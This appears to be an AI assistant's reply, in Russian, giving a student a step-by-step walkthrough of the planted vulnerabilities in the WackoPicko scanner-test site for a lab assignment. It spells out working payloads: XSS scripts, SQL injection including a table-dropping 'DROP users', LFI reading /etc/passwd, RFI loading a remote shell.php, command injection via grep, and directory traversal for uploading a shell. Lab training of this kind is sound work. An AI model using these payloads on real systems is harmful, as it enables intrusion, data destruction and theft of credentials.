Ты предоставил "ключ" к своей лабораторной работе.

Твой HTML-файл из первого сообщения — это WackoPicko, тестовый сайт, который подробно описан в этом PDF-файле. Авторы статьи создали этот сайт специально для тестирования сканеров уязвимостей.


Весь раздел 3.2 "Vulnerabilities"  — это точное описание 16 уязвимостей, заложенных в твой сайт. Вот пошаговый туториал, основанный напрямую на решении из твоего PDF-файла.

Часть 1. Публичные уязвимости (Не требуют логина)
Это уязвимости, которые ты можешь найти прямо с главной страницы.

1. Reflected XSS (в поиске)
Где: Форма поиска вверху страницы (/pictures/search.php).


Почему: Параметр query не фильтруется перед тем, как отобразиться обратно пользователю.

Как найти:

Введи в поле поиска: <script>alert('xss')</script>.

Нажми "Поиск".

Ты должен увидеть всплывающее окно (alert).

2. Stored XSS (в гостевой книге)
Где: Гостевая книга (/guestbook.php).


Почему: Поле comment не экранируется должным образом.

Как найти:

Перейди в Guestbook.

Оставь комментарий, содержащий JavaScript, например: <script>alert('stored xss')</script>.

Теперь любой, кто откроет гостевую книгу, увидит твой alert.

3. Reflected SQL Injection (в форме логина)
Где: Форма входа (/users/login.php).


Почему: Уязвимо поле username.

Как найти:

Введи в поле username всего один символ: ' (апостроф).

Введи любой пароль.

Нажми "Login".

Сайт, скорее всего, вернет ошибку SQL, что подтверждает уязвимость. (Ты можешь использовать это для получения всех имен пользователей и паролей из БД ).

4. File Inclusion (LFI / RFI) (в админ-панели)
Где: Админ-панель (/admin/index.php), которую ты нашел в футере.


Почему: Скрипт index.php принимает параметр page и напрямую подключает файл, добавляя к нему .php .

Как найти (LFI - Local File Inclusion):

Перейди по URL: /admin/index.php?page=/etc/passwd%00

%00 — это null-байт. Он заставит PHP "забыть" добавить .php в конец.

Ты увидишь содержимое файла /etc/passwd с сервера.

Как найти (RFI - Remote File Inclusion):

Перейди по URL: /admin/index.php?page=http://твой_сайт.com/shell.php%00.

Сервер WackoPicko скачает и выполнит shell.php с твоего сервера. (Требует, чтобы allow_url_fopen был включен на сервере, что в этой ЛР, скорее всего, так).


5. Command Line Injection (проверка пароля)

Где: На сайте есть сервис (скорее всего, не на главной) для проверки пароля на "словарность".


Почему: Параметр password без фильтрации передается в shell-команду grep.

Как найти:

Найди эту форму.

Введи в поле пароля: $; ls -la


Объяснение: $ закроет регулярное выражение grep. ; завершит команду grep. ls -la — твоя новая команда, которая выполнится на сервере.

6. Reflected XSS (за JavaScript-формой)
Где: Та самая форма на главной, которая генерируется через document.write (/piccheck.php).


Почему: Форма генерируется динамически. Параметр name из этой формы не фильтруется и возвращается пользователю.


Как найти:

Выбери любой файл.

В поле With this name: введи: <script>alert('js xss')</script>.

Отправь форму. Ты должен увидеть alert.

7. Parameter Manipulation (IDOR)
Где: Ссылка "Check out a sample user!" (/users/sample.php?userid=1).


Почему: Ты можешь манипулировать параметром userid.

Как найти:

Перейди по ссылке.

В URL измени userid=1 на userid=2 (или 3, 4...).

Ты сможешь просматривать профили любых пользователей, не имея аккаунта.

8. Weak Password (в админ-панели)
Где: Форма логина админки (/admin/index.php?page=login).

Как найти:

Введи логин: admin.

Введи пароль: admin.

Ты войдешь в админ-панель.

Часть 2. Уязвимости, требующие логина
Для этих тестов ты должен сначала создать аккаунт (/users/register.php) и войти в него.

9. Stored SQL Injection (в профиле)

Где: Поле first name (Имя) при регистрации нового пользователя.


Почему: Это значение не фильтруется и используется на странице "похожих пользователей".

Как найти:

Создай нового пользователя.

В поле first name введи: "; DROP users;# .

Войди под этим пользователем.

Найди и посети страницу "similar users" (похожие пользователи).

Как только ты ее откроешь, выполнится SQL-запрос DROP users, который удалит всю таблицу пользователей.

10. Directory Traversal (при загрузке фото)
Где: Страница загрузки фото (/pictures/upload.php).


Почему: Поле tag (тег) используется как имя поддиректории для сохранения файла.

Как найти:

Войди в систему, перейди на Upload.

Выбери файл для загрузки.

В поле tag введи: ../../.

Если ты загрузишь файл shell.php, он будет сохранен на два уровня выше директории upload, что позволит тебе перезаписать файлы сайта.

11. Multi-Step Stored XSS (в комментариях к фото)

Где: Комментарии к фотографиям (не гостевая книга).


Почему: Уязвимость такая же, как в гостевой книге, но ее сложнее найти, так как нужно войти в систему и подтвердить предварительный просмотр комментария.

Как найти:

Войди в систему.

Открой любую фотографию.

Напиши комментарий с XSS-полезной нагрузкой (например, <script>... ).

Нажми "Preview" (Предпросмотр), а затем "Confirm" (Подтвердить).

XSS сохранится на странице.

12. Forceful Browsing (IDOR)

Где: Доступ к купленным фото высокого качества.


Почему: Сервер не проверяет, действительно ли ты купил фото, когда ты запрашиваешь его по прямой ссылке.

Как найти:

Это сложно, так как требует угадывания URL.

Если ты сможешь найти (например, перебором) URL для скачивания "high-quality" фото, ты сможешь скачать его, даже не входя в систему.

13. Logic Flaw (в купонах)

Где: Система покупки фото и применения купонов.



Почему: Логическая ошибка позволяет применять один и тот же купон несколько раз к одному заказу.

Как найти:

Войди в систему, начни процесс "покупки" фото.

Дойди до шага применения купона.

Примени валидный купон.

Примени тот же самый купон еще раз (и еще).

Ты сможешь снизить цену заказа до нуля.

14. Reflected XSS (за Flash-формой)

Где: На домашней странице пользователя (после логина) есть Flash-объект, который спрашивает "любимый цвет".


Почему: Параметр value, который отправляет эта Flash-форма, не фильтруется.

Как найти:

Войди в систему.

Найди на своей странице Flash-объект.

Используй Burp Suite, чтобы перехватить запрос от этого Flash-объекта.

Вставь XSS-полезную нагрузку в параметр value.

(Остальные две уязвимости из 16 — это Session ID и Directory Traversal, которую я уже описал. Session ID в админке сложнее найти, она связана с тем, что ID сессии админа предсказуем ).



Удачи в выполнении! У тебя есть полная карта.
